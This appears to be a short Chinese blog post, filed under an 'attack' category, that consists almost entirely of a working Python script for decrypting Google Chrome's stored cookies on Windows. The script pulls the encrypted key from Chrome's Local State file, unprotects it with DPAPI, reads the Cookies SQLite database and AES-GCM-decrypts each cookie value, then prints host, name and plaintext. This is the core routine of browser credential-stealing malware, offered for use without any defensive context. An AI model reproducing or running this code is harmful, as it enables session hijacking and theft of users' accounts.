---
title: chrome解密
date: 2021-10-28
categories: ["攻"]
tags: []
---

# chrome解密

```
"""
1：获取local state文件位置

2：获取加密的key(base64编码)

3：DPAPI解密

4：ase-gcm解密

5：解析sqllite文件

"""
import os
import json
import base64
import win32crypt
import sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def AESGCM_decode(key, data):
    # 5.ase-gcm解密
    nonce, cipherbytes = data[3:15], data[15:]
    aesgcm = AESGCM(key)
    plainbytes = aesgcm.decrypt(nonce, cipherbytes, None)
    plaintext = plainbytes.decode('utf-8')
    return plaintext


def get_key():
    # 1.获取key
    LocalState = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")  # 密钥文件
    with open(LocalState, 'r', encoding='utf-8') as f:
        s = json.load(f)['os_crypt']['encrypted_key']
    # 2.解密base64
    encrypted_key_with_header = base64.b64decode(s)
    # print(encrypted_key_with_header)
    # 3.去除头5位的DPAPI
    encrypted_key = encrypted_key_with_header[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key


def get_cookie():
    Cookies = os.path.join(os.environ['USERPROFILE'],
                           r'AppData\Local\Google\Chrome\User Data\default\Cookies')  # cookie文件
    con = sqlite3.connect(Cookies)
    res = con.execute('select host_key,name,encrypted_value from cookies').fetchall()
    con.close()

    key = get_key()
    for i in res:
        print(i[2])
        print(i[0], i[1], AESGCM_decode(key, i[2]))


if __name__ == '__main__':
    get_cookie()
```